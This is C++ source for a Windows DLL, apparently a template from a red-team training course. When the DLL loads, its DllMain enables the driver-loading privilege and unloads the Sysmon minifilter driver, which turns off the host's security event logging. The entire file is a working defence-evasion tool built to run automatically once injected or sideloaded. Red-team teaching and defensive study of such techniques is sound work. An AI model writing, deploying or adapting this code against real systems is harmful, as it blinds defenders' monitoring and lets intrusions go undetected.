/*

 Red Team Operator course code template
 Sysmon minifilter unload
 
 author: reenz0h (twitter: @SEKTOR7net)

*/

#include <windows.h>
#include <stdio.h>
#include <fltuser.h>

#pragma comment(lib, "FltLib.lib")
#pragma comment(lib, "Advapi32.lib")

#define ENABLE 1
#define DISABLE 0


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("OpenProcessToken() failed!\n");
		return FALSE;
	}

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          printf("The token does not have the specified privilege.\n");
          return FALSE;
    } 

    return TRUE;
}


int killSysmon()
{

	if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE))
		return -1;
	
	printf("Unloading sysmon minidriver...");
	//HRESULT hres = FilterLoad(L"SysmonDrv");
	HRESULT hres = FilterUnload(L"SysmonDrv");
	if (hres == S_OK)
		printf("done.\n");
	else
		printf("failed.\n");

	return 0;

}
extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			killSysmon();
			break;
			
		case DLL_THREAD_ATTACH:
            killSysmon();
			break;
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			break;
	}
	
    return TRUE;
}


